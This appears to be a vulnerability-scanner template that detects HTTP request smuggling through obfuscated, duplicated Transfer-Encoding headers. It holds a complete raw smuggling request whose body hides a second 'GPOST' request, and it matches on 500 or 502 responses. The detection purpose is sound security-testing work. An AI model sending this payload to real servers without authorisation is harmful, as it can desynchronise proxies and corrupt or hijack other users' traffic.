id: http-smuggling-te-te
info:
  name: HTTP Request Smuggling - TE.TE Obfuscation
  author: WhiteFatalis
  severity: critical
  description: "Detects TE.TE vulnerabilities via header obfuscation (e.g., Transfer-encoding: xchunked)."
  tags: smuggling, te-te

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 4
        Transfer-Encoding: chunked
        Transfer-encoding: cow

        5c
        GPOST / HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 15

        x=1
        0

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
          - 502
